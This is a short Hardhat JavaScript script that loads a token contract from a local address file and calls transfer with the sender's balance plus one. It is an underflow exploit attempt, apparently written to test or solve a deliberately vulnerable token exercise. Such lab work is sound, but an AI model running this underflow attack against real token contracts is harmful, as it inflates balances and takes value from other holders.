const path = require('path');
const addresses = require('../Addresses.json');

async function main() {
    const scriptName = path.basename(__filename, '.js');
    console.log('----------', scriptName, '----------');

    const accounts = await ethers.getSigners();
    const sender = accounts[0];

    const tokenAddress = addresses[scriptName];
    const tokenContract = await ethers.getContractAt('IToken', tokenAddress);

    let balance = await tokenContract.balanceOf(sender.address);
    const txTransferUnderflow = await tokenContract.transfer(tokenAddress, balance+1);

    console.log('----------End----------', txTransferUnderflow.hash);
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
})